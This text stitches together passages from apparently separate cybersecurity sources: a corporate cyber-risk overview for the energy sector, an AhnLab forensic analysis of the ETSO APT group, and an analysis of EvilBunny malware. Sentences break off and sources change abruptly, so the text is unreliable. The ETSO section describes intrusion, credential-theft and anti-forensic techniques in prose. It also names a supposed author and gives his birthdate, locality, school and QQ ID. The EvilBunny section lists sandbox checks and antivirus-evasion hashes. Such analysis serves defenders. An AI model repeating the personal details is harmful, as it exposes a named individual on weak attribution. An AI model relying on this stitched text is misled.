Examples of such attempts include luring Internet users into execution of malware and Spear Phishing .
A group of attackers who are particularly good at social engineering is Anonymous .
These hackers typically exploit easy - to - guess passwords of users or use emails to trick users into revealing confidential information or into clicking links which lead to the download of malicious software .
However , Anonymous is not the only group of people who are familiar with this technique .
In fact , cyber criminals and state - sponsored attackers have been practising it for a far longer time .
The stakes are also bigger for them as they stand to gain a whole lot more of important information .
Eddie Schwartz , chief security officer of the security firm RSA summed it up best during a security conference in San Francisco in 2012 when he said : `` The attacks by them ( Anonymous ) pale in comparison to the nation - state stuff and the criminal element … The more eyes , the greater chance of success ( for an attack ) '' , which accurately depicts thecyber environment nowadays .
Source : 2012 KPMG paper `` A nuanced perspective on cybercrime '' .
The objectives of cyber attacks can be divided into two distinct categories .
These are • misappropriation and theft of intellectual property , financial data or other confidential information for monetary gain or to gain a competitive edge ; • corruption or disturbance of key business assets and processes for strategic purposes or to make an activism statement , However , the actual impact on victim companies could be much broader and more profound .
More specifically , direct consequences of such attacks comprise disruption of business and production processes , unauthorised access to monetary operation , loss of intellectual property , disclosure of merger - and - acquisition deals , identity theft and compromising of customer data .
Such attacks can also adversely affect third party partners in the industrial chain .
But all the above consequences are just the tip of the iceberg .
Deeper financial and reputational impact further includes loss of competitive advantage in accessing new fields , failure to keep current clients and investors , losing deals and disputes ( or winning them on unfavourable terms ) , regulatory fines , liability lawsuits , share price drops , costs involved in fixing business relationships and even negative international publicity .
In addition , the company would very likely be forced to spend more than usual to fix systems and repair damages .
It is also very likely that costly fees will be incurred from services of third party experts and consultants for mitigation and recovery services .
There could also be forced expenditure on personnel change , organisational restructuring and additional training .
Source : 2012 KPMG paper `` A nuanced perspective on cybercrime '' .
However , effective awareness requires continuous effort to remain vigilant .
In this aspect the financial institutions seem to be doing a better job in understanding the potential `` enemy '' compared to the other industries , including the ENR sector .
The Obama administration submitted a cyber security proposal to Congress last May to outline its priorities for cyber security and to press lawmakers to pass comprehensive legislation to protect critical U.S. infrastructure that powers the Internet , utilities , and other control systems that are vulnerable to attack .
Feds Simulate Crippling Cyber security Attack On NYC Electricity [ March 2012 ] Advances in technology and mounting concern about the potential for a cyber attack to damage power stations , water - treatment plants and other critical systems have prompted senior officials to seek a more robust role for the department 's Cyber Command .
For one thing , cyber attacks can take place in milliseconds .
The assailant may be unknown .
The attack route may be hard to trace , crossing multiple countries .
Pentagon proposes more robust role for its cyber - specialists [ August 2012 ] Iran is to move key ministries and state bodies off the worldwide internet next month in an effort to shield them behind a secure computer wall from disruptive cyber attacks like the Stuxnet and Flame viruses .
It must be made clear the cyber world is no longer playing in the `` minor league '' , but rather the `` major league '' with players who potentially have access to unlimited resources and endless patience in achieving an aforementioned objective .
On a second note it is extremely necessary to conduct thorough analysis of risks and have a clear understanding of the different asset value perception .
What seems of little value to one firm might be worth a lot more to attackers who have a totally different perspective or who are planning an attack on a chain of companies .
As a result , consideration should be given to the relationship between the costs for implementing detective controls and costs of incidents .
The latter should include indirect damages incurred on consumer confidence and reputation , the two most valuable assets of a company .
A 2012 survey titled `` A nuanced perspective on cybercrime '' which was conducted by KPMG in Netherlands , stated that out of the 170 responding organisations under various sectors including ENR , approximately 19 percent of them spend more than 1.5 million euros on cybercrime prevention , detection and response per year .
Thirdly , whether short term measures or long term controls have been implemented , the upper management of companies should never be complacent and believe that they enjoy 100 percent security .
The IT landscape in many modern organisations is simply often too complex for complete protection .
The same 2012 KPMG survey also revealed that 45 percent of companies experienced attempts of cybercrime attacks in 2011 .
In addition , 55 percent of respondents were unsure of whether they can effectively respond to a cybercrime attack , and only 20 percent said they can respond effectively to an attack but unfortunately do not have an attack response plan in place .
Among all the responding corporates , approximately 30 percent have forensic capabilities as a control and only 55 percent have central incident and event monitoring capabilities .
Most importantly , it is vital for the management to set the correct tone .
The survey also showed that more than 75 percent of respondents believe that fighting cybercrime goes beyond installing the needed technology to curb it .
Some 90 percent of them also agree that cybercrime should be discussed at the board level .
Most respondents from the ENR sector of the same KPMG survey do not think so .
They believe that hackers are more likely to win in this sector compared to other industries .
If a company does not consider itself to be ready , actions must be taken .
Management should endorse prevention efforts and start seeking a structured approach .
There also has to be effective use of security monitoring and seamless cooperation between the different parties involved so that knowledge and expertise can be shared among government , business communities , IT security groups and even cross - border organisations .
Beyond the prevention of incidents , timely detection and an adequate response are also critical .
If there is any major gap or deficiency in the policies , procedures and tools of a company , the worst time to discover these would be when a cyber security incident is already set on its course .
In terms of short - term actions , the company could perform risk analysis from the perspective of an attacker , identify and monitor critical assets as well as begin implementing a standby incident response team .
In the long run , companies should strive for cost - effective control of the cyber environment by addressing the domains of people , processes and technology .
Yet , even the most comprehensive security control system can not guarantee the complete prevention of cyber incidents .
An incident response plan and an emergency action plan is therefore also of paramount value in the proper handling of a security compromise and reducing the subsequent damage .
If a thorough and detailed plan is not available , the very least an organisation should do is to be familiar with some basic concepts and simple primary actions to respond to an incident .
This helps the company achieve more effective business resilience , which is important especially for the protection of the most critical assets .
The fundamentals of cybersecurity are probably best summed up by Ron Ross , National Institute of Standards and Technology ( NIST ) Senior Fellow , who said during a launch of NIST 's latest guidance on security controls : `` The fundamentals of cyber security … I call it the physics of security … do n't change over time … how we apply those controls ...
In terms of risk assessment , the organisation must not only consider itself as an attractive end target , but also consider its part in the supply chain .
It should also not view itself as one entity that should be protected , but as a collection of processes , users and IT infrastructure .
Companies should focus on being well informed of ( the character ) of possible threats and invest in a proper defence .
They should not do this in an isolated way , but rather use the knowledge and experience of colleagues in both the public and private sector .
A joint response is essential for protection against cyber espionage , terrorism , crime and disruption of information and communication systems .
With respect to the industrial control system , ICS - CERT suggests a proactive security model as depicted in the Figure 6 below .
This model can be further complemented with a more detailed five - step approach in protecting information and records : • Obtain executive sponsorship , establish a team , and determine the team 's goal , objectives , and milestones - ensuring that these efforts are aligned with the goals of the business .
Policy content should be comprehensive , consistent and implemented with process changes and the introduction of appropriate controls and metrics to measure effectiveness and compliance .
Classifying the sensitivity of information should be a key goal .
Enhanced process and data workflows , controls , and processes are a key outcome .
The result is a programme that helps leaders ensure the risk - based protection of information assets .
There have been quite a few cases worldwide where KPMG applied the use of frameworks and helped different clients with their needs in achieving the goal of cyber security .
In the Dutch market , joint efforts of the financial sector are pretty successful in boosting awareness .
Aside from cooperation between financial institutions and the Government , KPMG also actively shares experiences as part of the focused joint efforts .
Generally , there are three types of security controls : prevention , detection and response .
Attack patterns observed at other banks and solutions applied by these institutions help to shape an image of upcoming attacks and solutions relevant for Company B .
Knowledge of the latest cybercrime attack trends and defence measures helps Company B to update the bank 's defences on time in order to adequately respond to attacks .
In general , preventive controls are more popular than detective controls whereas detective controls are used more often than responsive controls , as in this case of how KPMG helped a company in the ENR industry .
However , as discussed earlier , incidents can not be avoided 100 percent of the time .
This implies that detection and response are equally important and are thus the areas with the biggest room for improvement .
Company Z is a well - known company in the oil , gas and natural resources industry .
The platform correlates information about thousands of security events from numerous systems spanning across the globe .
A list of the most relevant cybercrime risks for Company Z was drafted in close cooperation with the organisation .
For each risk , a set of detection rules was defined .
The ability to adequately respond is mainly achieved by properly established processes and governance .
Below is another example illustrating KPMG 's experience in adequate and systematic response after a security incident has taken place : Company A was informed by a whistleblower that an attacker gained access to the company 's website and/or closed environment .
In response to this news the website was taken offline and KPMG was asked to assist .
Even if it is within an organisation itself , one way of improving the handling of specific cyber incidents related to industrial control systems would be to gather a group of staff to conduct brainstorming and collaboration exercises During such sessions , staff from various departments will get to receive more adequate cyber security training , initiate effective inter - departmental interactions , and update antiquated policies and procedures .
They can also get to identify and fix any security flaws found in the system , so as to create a corporate and organisational environment that is more resistant to cyber attacks .
The battle against cyber crime is one which is difficult to win .
From the perspective of the Asia Pacific region , we understand that data security is not an easy concept for most business leaders to fully grasp .
In part , this is because many organisations do not have a clear view on the actual value of their data and as a result , tend to follow a one - size - fits - all approach to data security .
At the same time , organisations in this region have also seen a gradual migration of their corporate value away from physical assets ( such as facilities , products and people ) towards digital assets ( such as bid information , technology designs or customer data ) .
Therefore , most businesses have robust crisis plans for events like floods , fires or sudden executive departures , but have very few for digital security issues .
An organisation in the ENR industry must stay as up - to - date as possible with security issues and set in place effective security measures .
Beyond doing so , an ENR organisation must evaluate itself through the eyes of potential attackers so as to identify and protect parts which represent the highest substantial value .
The importance of executive leadership and support in developing a data security strategy can not be overstated .
The risk of data loss should be a board - level issue and not a challenge isolated to the IT department and risk managers .
This means that executives must not only ' walk the walk ' when it comes to complying with protocols , but also actively participate in the development of security to ensure that the rules reflect the priorities of the business .
Most importantly , executives must strive to institutionalise continuous improvement mechanisms to ensure that they learn from hard - earned lessons of the past .
Should a cyber security transformation be undertaken , the five recommended objectives would be to Prevent , to Prepare , to Protect , to Remediate and to Integrate and Transform .
However , given the scope and complexity of the challenge , it is not surprising that most executives are left wondering how best to approach the issue without dampening productivity or expending scarce resources .
It is important that executives in the Asia Pacific region balance a cautious approach to IT security with the downside and damage that can be caused by the lack of being able to carry on business as normal and the loss of confidential and sensitive information .
The ETSO APT Attack Analysis is based on analysis conducted by A - FIRST , the AhnLab digital forensic team .
This report provides a detailed nature of Advanced Persistent Threats which were led by `` ETSO Hacking Group '' ( referred to as ETSO , ETSO Attack or ETSO Hacking Group hereinafter ) since 2010 .
Based on incidents at 12 companies , this report shows how the ETSO APT attacks progressed , which methods were used at each stage of the attacks and the results of the ETSO malware analysis .
The statistics in this report are extracted from AhnLab Smart Defense , a cloud - based malware analysis system , known as ASD .
Until now , ETSO Attack Group has fiercely attacked multiple companies for various purposes such as stealing business know - how of online game companies as well as for certificates and cyber money .
In the APT attacks against the companies in Korea , the ETSO Attack Group used encrypted communication between the master which generated the malware , monitored the system and managed the C2 agent , and the agent which accessed the C2 server .
The ETSO Attack Group penetrated the targeted network via the C2 agent and remained dormant for a long period of time without any abnormal behavior that would trigger a network error or website compromise , thus making it difficult to detect the attacks .
Considering that the ETSO Attack Group used the email accounts of the security division of the target company to distribute more malicious emails through the employee accounts and reacted in real - time to security responses and the business schedule of the target , it is assumed that there were Korean natives or multilingual persons among the attack group .
As the ETSO APT attacks have progressed , the malicious codes used in the attacks have consistently improved and become more sophisticated since 2011 .
The attacker has been very unpredictable or rather , creative , and has not left any traces .
This has made digital forensics as the only method applicable for extracting the appropriate data in unallocated areas in order to analyze and respond to the ETSO APT attacks .
The C & Cs ( Command & Control ) attacked by ETSO were mainly located in South Korea , Hong Kong , China and the US , reaching a peak of 64.30 % of all attack locations .
The C & C servers which were used to attack Korean game companies came primarily through IPs from South Korea and Taiwan .
Normally , there are specific game servers for specific countries .
When the entire IPs were blocked from a certain country , the attacker would use another country 's IPs and continue on with the attack .
South Korea was the primary victim of the ETSO APT attacks with an infection rate of 85.6 percent .
The nature of the attack was geared towards the internet game industry , of which South Korea has the most clients .
Based on the analysis of malicious codes creator known as the master and the ETSO APT malicious codes , and using the first distributer of the malicious files IPs as the standard , it has been incontrovertibly determined that the majority of the IPs came from China .
In order to penetrate a company 's internal network , the ETSO Attack Group used an external update server .
First , the group seized the update server of application program , which is most frequently used since these types of programs are not highly managed and easy to attack .
The attacker then changed the update setting file to be downloaded on to the user 's system .
Finally , the module of the application program in the user 's system reads the modified setting file and downloads to execute the malicious codes from the server which was built by the attacker .
Since this type of attack is hard to detect , the attack was much more likely to succeed bringing about a catastrophic result with a single attack since many users use the application update server .
Moreover , the attacker who seizes the update server targets a specific IP bandwidth of the company rather than randomly distributing malicious codes .
The reason why the attacker opts for the former is because random distribution that scatters malicious codes are more likely to be discovered and may be more easily detected by security products .
Once the malicious code penetrates the internal network , it will acquire various kinds of information using the user account .
The attacker obtains the ID , password , NTLM hash value from the registry and memory area and moves on laterally to another system .
The attack process is as follows : Using the user account information , the attacker creates an agreement with the network sharing system of the target system and the malicious code is then copied .
The work schedule is registered and the copied malicious code is activated .
This type of attack is called the Pass the Pass , Pass the Hash attack method .
The ETSO Attack Group used tools such as gsecdump , which was already disclosed before , WCE ( Windows Credentials Editor ) , and mimikatz ; or , alternatively , they may have used DLL ( wceaux.dll , sekurlsa.dll ) , which were inserted in the malicious code to attack the system .
Such attacks are possible because most systems within the company often use the same local administrator ID and Password for the sake of convenience .
Or within the Active Directory , it tends to use the same domain administrator account to access multiple systems , leaving the domain admin ID , password and hash value in the memory .
The ETSO Attack Group signed the malicious codes using the certificate they obtained .
The reason for stealing certificates lies in the fact that files that are not signed by a legitimate certificate will be detected by security products .
Therefore , besides attacking the updates for cyber money and personal information , the stealth quality of certificates was also one of the attack goals of the ETSO Group .
This indicates the characteristic of the attack , which shows that the multiple attacks were made by a single group .
In order to hide oneself , the attacker used more than one anti - forensic tactic .
The ETSO Attack Group copied the batch file when copying the malicious codes via network sharing , and it was this batch file that proceeded with anti - forensic techniques .
The batch file used the malicious code and cl option from the work schedule file ( .job
These types of anti - forensic tactics make forensic analysis difficult , hindering the effort to find the entrance of attack through back - tracing .
The ETSO Attack Group attacks for monetary reasons .
For example , the Group attacks cyber money updates and personal information .
Even if the attack is detected by security products , the attack continues on with the purpose of interfering with the service and ultimately destroying the system .
Once the DB is accessed by the attack , the malicious codes continue to be distributed , creating an overflow to keep a connection with the C & C server , even when the system admin or analyzer finds the malicious codes and deletes them .
Thus , it is very difficult to block the attack if all of the attacks are not analyzed well and dealt with all at once .
Table 4 shows the footprints of the attacker and a summary of the response .
The ETSO Attack Group is seen here to have improved its attack technique in various ways as time passes .
In early days , ETOS hacking group used random file names , algorithms , and path for installing malicious files .
As time passed , however , they changed the naming scheme to sound similar with normal file names or system rules making malicious codes detection difficult .
This is the first stage where the attacker first tries to enter the company 's internal network .
Many times , the ETSO Attack Group targets the update server , which is the most frequently used application program in the company .
The attacker will seize the server and change the settings so that the malicious codes are downloaded on a specific target system .
Another method is to disguise itself as an internal mail , enticing the user to open and execute the file .
In this case , the attacker disguises oneself as an employee from a security division , sending out email with a malicious hyper link .
It has been found that the attack email is written in Korean , indicating that there are native Korean speakers in the ETSO Attack Group .
The attacker that succeeded in initial attack creates a backdoor to the system and prepares a path for continuous attack .
In this case , the first attack is mainly made on the employee 's network regularly used for general work .
In the case of the ETSO Attack Group , the back door generation program made it possible for many techniques to be executed with a variety of `` back doors '' to communicate with the C & C .
The common functions of each of the back doors are as follows : - System Information and Control - Search option - File transfer to C & C server - Control of process and module - Service control - Registry control - Instant screen capture - Remote control - Command Shell - Proxy function ( open port ) - Keylogging In addition to the above mentioned ways , in order to secure the additional attack route to the network , the ETSO Group uploaded the back door on the internal file server that was openly shared within the company .
The uploaded back door was disguised as a generally used program such as a driver , Office or Chrome install file .
Such disguised features induce users to install the file .
The attacker who successfully installed the back door on the initial attack , then moved on to the target system .
In order to progress , the attacker needed to access an account from a higher authority such as information from an administrator , including ID , password and NTLM Hash information , all available in the system registry and memory .
In the case of the ETSO Group , they would use existing tools such as gsecdump , WCE ( Windows Credential Editor ) , mimikatz or insert the DLL ( wceaux.dll , sekuralsa.dll ) in the malicious code , dropping and calling the information .
In addition , the attacker may use its key logging function from the backdoor to steal the ID / Password .
For the sake of convenience , the same IDs and Passwords are mainly used for all of the local system administrators .
Also , a domain administrator account is used to access more than one system in the active directory setting .
In this case , the attacker can easily acquire the administrator 's ID / Password as well as the hash value .
The attacker who obtained the account information of privilege authority then created a back door to the system .
In this case , if the acquired account was the domain administrator 's , then the attacker could install back doors on all of the corresponding parts of the domain as well as the domain and systems in trust relations .
The install process is as follows : The attacker will use the acquired ID / Password or NTLM Hash value to create an agreement with the system network to move to , and copy , the back door .
The copied backdoor is then executed using the work scheduler , and it is operated using the system authority .
The executed back door then broadcasts connection status with the C & C server using the proxy feature , and the attacker approaches the corresponding system based on the broadcast information .
The attacker repeats the process until the target system is found , such as a DB .
In most cases , the attacker will search for an administrator 's system inside the network , approach the gateway server and finally enter the server network .
From then on , the attacker uses the same method and installs many back doors in the server network .
The attacker uses various Reloading Point techniques in order to maintain the connection between the installed back door and the C & C server .
First , a Bootkit technique will be used to load the backdoor after transforming the MBR .
The characteristic of the bootkit is that the corresponding bootkit is encoded with XOR on the loading data inside the trash and it is saved .
Another method is to use files such as wiarpc.dll , tsvipsrc.dll which are loaded automatically during booting .
The malicious file such as the DDL is saved under folder 32 and is used during the back door reloading .
Registering the back door as a general service is also one way it may be used .
The attacker uses various kinds of anti - forensic techniques in order to avoid being disconnected with the C & C server once the back door is discovered .
The backdoor install file and batch file are copied by network sharing , and the batch file is executed with the work scheduler .
The batch file executes the back door install file and deletes the install file as well as the work schedule file ( .job
Additionally , the registry key values are deleted in order to erase traces of the back door execution into the service .
With these anti - forensic techniques , the attacker reduces the backdoor detection rate , avoiding the chances of being caught by back tracing .
In addition , a method of installing backdoor only in the memory area was applied , since this can avoid the threat detection of security products .
After installation , the backdoor erases all of the files and only exists in the memory while waiting for the system to turn off .
When the system is turned off , the files needed for back door reloading are generated and they are loaded during system booting .
Then , the loaded back door erases all of the related files and stays only in the memory .
Even though administrators and analysts detect back doors and delete them , the attacker will install even more back doors on the system to maintain its connection with the C & C server .
The attacker who approaches the DB server will proceed with various kinds of tasks depending on the attack purpose such as attacking the cyber money or stealing personal information .
In the case of a cyber - money update , a query request is made on the DB using the features embedded on the back door and by SQLCMD.EXE .
Or , the existing Stored Procedure is changed to update .
When the Stored procedure registered in the mail table is changed and the mail is received , the Stored Procedure is operated to update the cyber money of a specific character .
Also , the DDL which is used in the MS SQL DB which transforms the opends60.dll ( SQL Open Data Services DLL ) , can be used to update the cyber money .
In case of information leakage , a DB for a customer information dump file is generated , compressed as BZIP ( bz2 ) and exported out using FTP .
On the top portion of the master , there are two main menus : agent list and agent master .
The center area shows the directory of the agent lists which are connected , and the bottom portion shows variety of options related to the master .
In the initial access , a request for connection is made from an infected remote PC to the master .
If the Three - Way Handshake is made between the two , the PC and master will be connected and the information of infected PC will be delivered to the master .
Then , after every 60 seconds , the Keep - Alive traffic will be created to check the connection between the master and the infected PC .
In the same OS environment , the same IP and Port were used during the test .
It has been found that the traffic is different in its delivery over the same command .
After repeated tests , a pattern was found in the traffic between the infected PC and the master .
Thus , it is surmised that it was not completely encrypted but was encoded by a certain level .
Including the initial connection , the traffic encoding was also applied in the Keep - Alive traffic and in the all command transferred traffic .
The Key logging and CMD command results were also not delivered in plain text but in encryption .
Currently , the communication between the ETSO malicious code master and the agent is being encrypted .
It seems impossible to create a PCRE and REGEX pattern which can be blocked by IDPS and other network security system .
Regarding the newest version of ETSO , it is assumed that there must be a telecommunicating module hiding within the network traffic .
The question is thus raised regarding who actually made the ETSO Attack tool in the first place .
An investigation was conducted to find the ESTO APT creator as the ETSO master 's traces were traced back in the analysis .
In the ETSO master , you can see the http access on the lower menu of the malware toolkit ; the Baidu URL values are seen .
Baidu is the largest portal site in China .
In the middle , you can see the string `` DZKSJDADBDCDH - DOCADOCADOCBDDZJS '' .
The string appears when the IP is entered and information is changed , setting the initial value to be `` 127.0.0.1 '' .
At this time , the value DZKSJDADBDCDHDOCADOCADOCBDDZJS is set .
Through a Google search of the ' DZKSJDADBDCDHDOCADOCADOCBDDZJS ' string on the malware toolkit , a link of ' http : //tieba.baidu.com / p/1103191865 ' was found .
There were reply messages titled TEST and all of the messages were submitted by a person with the ID `` whg0001 '' .
This value matches the one on the ETSO malware toolkit .
It is assumed that the attacker designated a specific blog address when the ETSO APT malicious code agent was activated in order to immediately determine whether the attack was successful or not .
The attacker can know the victim 's IP address after decrypting the encryption .
It is assumed that the according blog content is related to the APT tool creation .
Thus , a further investigation was made on the person with the ID of whg0001 .
When the link of whg0001 is clicked , brief information on the person with the ID whg0001 appears .
He is a male who was born and still lives in Szechuan , Chengdu .
Below is the translation of the detail information : < table Gender Male , Birthdate Jan 1 1991 Basic Info Place of Birth Szechuan , Chengdu , Chengyang Qu Current Address Szechuan , Chengdu , Chengyang Qu Body Figure Slim Marital Status Married Non - smoker , occasional drinker , likes to take Habit naps during the day Detail Info Personality Cheerful and calm personality Highest Education University Major Computer Science / Network < /table On his blog , whg001 wrote on Aug. 17 , 2011 , `` I visited my home school a couple days ago .
Looking back , those were the happiest days .
Thus , it has been determined that whg001 attended Jipu High School .
According to the writings on the board and the content of whg0001 's blog , the name of the writer is Jiao Xang Bo , who entered high school in 1994 in homeroom number 4 .
Also , he was looking for a classmate by leaving a message with his QQ ID .
After investigating the personal information of whg0001 , further investigation was made of his online activities .
As a result , it has been found that he left comments on the attacker 's freeboard regarding the design of Trojan horse ( Refer to Figure 27 ) .
Unfortunately , the attacker freeboard does not exist anymore .
I have realized all of the packets ' MIMA ( password / man in the middle attack ) different when designing the Trojan horse .
To go around the vaccine detection , a transformation and other technologies were used to on the Trojan horse .
To find the document made by whg0001 , the ID was used to search on Baidu .
As a result , a document titled `` VTCP Introduction and Entry ( V11.X ) '' was discovered .
To take a closer look at the document , a link ( ' http : //wenku.baidu.com / view/2005a703-bb68a98270fefa06 ? fr = prin ' ) was accessed ( as of August , www.cnasm.com , the address mentioned within the document , was no longer accessible ) .
Using the QQ ID ( 312016 ) above , the result of the QQ main page was as follows : In [ Figure 26 ] , the Chinese characters wu hua guo appear .
The first letter of each synonym has been used as an ID .
So far , the following information has been collected on the attacker who created the ETSO with ID of whg0001 ( refer to Table 7 ) : The Chinese - originated APT Attack Group ETSO has been attacking South Korea since 2011 .
A - FIRST from AhnLab has done a forensics analysis using the ASDE ( AhnLab Smart Defense Enterprise ) network and on the damaged company for years .
According to the study , ETSO is different from other attackers in following ways : - ETSO analyzes the update structure of a product popularly used in South Korea , in order to distribute malicious codes through reliable products and ultimately , the company .
-Not only was the feature embedded on the back door used to attack the cyber money update , but a direct DB query through SQLCMD.EXE , Trigger through the transformation of Store Procedure registered in the email table and opends60.dll ( SQL Open Data Services DLL ) transformation were all used in the MS SQL DB in the attack .
Suspect # 4 is the fourth out of a row of malware samples , which are believed to stem from the same malicious actor .
Insights on the campaign were first presented at Hack.lu Conference 2014 in Luxembourg .
The name ' EvilBunny ' is derived from a link to debug information embedded in the dropper binary of suspect # 4 .
The path to the associated .pdb - file
The exploit would download the bunny dropper and install suspect # 4 on the infected system .
Both , dropper and payload were compiled on 25th of October 2011 , while CVE-2011 - 4369 was released only on 16 th of December .
It is unclear as of when the attacks started ; although , clearly , either the attackers adopted the vulnerability within 4 days or the attacks were performed using an AdobeReader 0-day .
The functionality of the dropper can be summarized in the following steps : • Sandbox check and anti virus product enumeration • Dropping payload ' netmgr.exe ' • Creating a registry key for persistence • Creating a registry key for deletion of the dropper Searching for a sandbox environment , the malware takes a number of simple steps to verify .
It tests the module file name to see if it is less than 5 characters long or if it contains either of the four strings ' klavme ' , ' myapp ' , ' TESTAPP ' or ' afyjevmv.exe ' .
Also , it verifies if less than 15 processes are running in the environment , using the API call EnumProcesses .
In case any of the conditions is met execution will abort .
Up to the time of writing it remains unclear which environment the mentioned strings aim to identify , if any .
Accessing the systems WMI ( Windows Management Interface ) the malware queries the installed AntiVirus software by issuing ' SELECT * FROM AntiVirusProduct ' .
More specifically , the malware is interested in the data fields ' productUptoDate ' , ' VersionNumber ' , ' DisplayName ' and ' productState ' .
The information about AntiVirus provided by WMI differs between Windows versions , so the requests address different namespaces , ' ROOT\SecurityCenter ' for WindowsXP and ' ROOT\SecurityCenter2 ' for Windows Vista and newer versions .
Names of AntiVirus products are represented as hard coded SHA-256 hashes , namely the following : d4634c9d57c06983e1d2d6dc92e74e6103c132a97f8dc3e7158fa89420647ec3 4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f bfe74ca464620a62f11b8c47a3778bb132d84fecd90ce7c75817970f2eeeca51 Antivirus 443b6fb65fa57d57ee3113e48e9b4ed1db2921d5352e27fa85064cd60553c3ff BitDefender e1625a7f2f6947ea8e9328e66562a8b255bc4d5721d427f943002bb2b9fc5645 588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c f1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56 Kaspersky Only three of the seven hashes were identified .
If any of the indicated products is installed and active on the machine execution will abort .
The dropper comes with its payload attached in the resource section .
The resource RCData contains the entire netmgr.exe binary ; alleged suspect # 4 .
The binary is dropped as netmgr.exe , either located in % APPDATA % \Perf Manager\ or % WINDIR % \msapps\ .
The final directory location depends whether the dropper is running with administrative privileges or not .
Interestingly , the dropper also changes the creation time stamp of the newly created binary to time stamp of the system executable explorer.exe .
This serves to avoid raising suspicion of a forensic analysts or tools .
As a means of persistence the dropper creates an entry under [ HKLM| HKCU ] \ ...
This ensures that netmgr.exe will be executed every time the system boots .
Furthermore , the dropper generates another entry in the Windows registry , under [ HKLM| HKCU ] \Software\Microsoft\IPSec .
This entry is named ' isakmpAutoNegociate ' and points to the dropper binary .
This key will be requested by netmgr.exe later to locate the dropper binary and delete it .
The naming of the key for cleanup of the dropper is chosen to confuse analysts , although the name is clearly misspelled .
Another interesting side fact is that the dropper does not start the dropped malware , neither does it contain code which could even do so .
This implies , the final infection stage does not start unless the infected machine is rebooted .
Also , the dropper binary will not be deleted in the meanwhile .
Suspect # 4 was the fourth discovered sample in a row of malware related to the EvilBunny attacks ; even before its dropper .
Yet , it is by far the most interesting one .
It is a multi- threaded bot with an integrated scripting engine .
It incorporates a Lua engine and downloads and executes Lua scripts to reach a certain level of polymorphism .
The Lua scripts can call back into the C++ code to alter the malware behavior at runtime .
The malware seeks to keep a low profile on the infected machine , while executing the botmaster 's commands and Lua scripts .
In total Suspect # 4 exhibits three different methods for receiving C & C input and executing commands ; directly via HTTP , through a downloaded database file or as a scheduled task .
Also , the malware will generate numerous files to help its execution and frequently reply back to the C & C with status messages .
The initial purpose of the malware seems to be sharing execution load among infected host machines .
However , due to the lack of the original Lua scripts and the extensive functionality of the embedded Lua engine the original intentions of the attackers remain unknown .
Suspect # 4 is written in C++ , and just like its dropper , it is not protected by any runtime packer or crypter .
It is , however , compiled with a performance optimization option which causes a lot of code in - lining and duplicate code in the binary .
Duplication also applies to string constants , as every string is present once per function , if the given function uses it .
This might accelerate execution speed of the bot at runtime , but implicitly or even on purpose hinders static analysis of the binary code .
Cross referencing of strings or helper functions is ineffective due to the duplications .
Only few anti - analysis measures can be found in the binary .
One function exists , which resembles the sandbox check of its dropper with minor extensions .
This sandbox detection consists of three parts : • The module path name should be more than 5 characters long and contain either ' msapps\ ' or ' Perf Manager\ ' , which is the case if the sample was legitimately dropped by its dropper .
These are NtQuerySystemTime , GetSystemTimeAsFileTime and GetTickCount .
Every API is called twice to calculate a delta , while performing a sleep ( 1000 ) operation between iteration one and iteration two .
The final condition is , if any of the three deltas is below 998 milliseconds execution will abort .
This can only be the case if any of the three API 's return values is modified by a system monitoring solution , like a sandbox .
Another evasion trick implemented by the malware is the partial obfuscation of API names .
For no obvious reason though , the obfuscation algorithm is only applied to a small subset of APIs used in the code .
The algorithm uses the fixed value AB34CD77h and a combination of XOR and ROL instructions to calculate hashes from the export names of kernel32.dll , advapi32.dll and psapi.dll .
It is important to note that this obfuscation trick and the according hash function remain consistent through out all related samples .
Similar to its dropper , suspect # 4 enumerates the system 's installed AntiVirus product and checks firewall settings .
For AntiVirus detection it utilizes WMI and issues ' SELECT * FROM AntiVirusProduct ' .
Identification of installed products is achieved by comparing the hashed product name to a set of SHA-256 hashes ; although , a different and much bigger set than used by its dropper .
With the help of hash tables from perturb.org and md5decoder.org it is possible to revert some of the hashes to their original text form : a48be88bed64eff941be52590c07045b896bc3e87e7cf62985651bbc8484f945 MAfee 1ba035db418ad6acc8e0c173a49d124f3fcc89d0637496954a70e28ec6983ad7 a7f9b61169b52926bb364e557a52c07b34c9fbdcd692f249cd27de5f4169e700 2bc42b202817bdab7d49506d291e3d9624ae0069087a8949c8fcb583c73772b1 Norton f7d9ea7f3980635237d6ea58048057c33a218f2670e0ff45af5f4f670e9aa6f4 Panda 522e5549af01c747329d923110c058b7bb7e112816de64bd7919d7b9194fba5b Rising 4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f d4634c9d57c06983e1d2d6dc92e74e6103c132a97f8dc3e7158fa89420647ec3 9e217716c4e03eee7a7e44590344d37252b0ae75966a7f8c34531cd7bed1aca7 Trend e1625a7f2f6947ea8e9328e66562a8b255bc4d5721d427f943002bb2b9fc5645 588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c ab6ed3db3c243254294cfe431a8aeada28e5741dfa3b9c8aeb54291fddc4f8c3 b3fe0e3a3e3befa152c4237b0f3a96ffaa44a2d7e1aa6d379d3a1ab4659e1676 AntiVir 0d21bd52022ca7f7e97109d28d327da1e68cc0bedd9713b2dc2b49d3aa104392 c0ffcaf63c2ca2974f44138b0956fed657073fde0adeb0b1c940b5c45e8a5cab avast 249a90b07ed10bd0cd2bcc9819827267428261fb08e181f43e90807c63c65e80 AVG b39be67ae54b99c5b05fa82a9313606c75bfc8b5c64f29c6037a32bf900926dd 4b650e5c4785025dee7bd65e3c5c527356717d7a1c0bfef5b4ada8ca1e9cbe17 CA c8e8248940830e9f1dc600c189640e91c40f95caae4f3187fb04427980cdc479 97010f4c9ec0c01b8048dbad5f0c382a9269e22080ccd6f3f1d07e4909fac1a5 aa0ad154f949a518cc2be8a588d5e3523488c20c23b8eb8fafb7d8c34fa87145 333e0a1e27815d0ceee55c473fe3dc93d56c63e3bee2b3b4aee8eed6d70191a3 G 977781971f7998ff4dbe47f3e1d679f1941b3237d0ba0fdca90178a15aec1f52 Jiangmin f1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56 Kaspersky The malware retrieves the attributes ' productState ' , ' DisplayName ' and on WindowsXP also ' productUptoDate ' .
It is noteworthy though , that for netmgr.exe the existence of any of the indicated AntiVirus products does not pose a reason to end execution .
In fact , these hashes are the only measure for obfuscating strings in the binary .
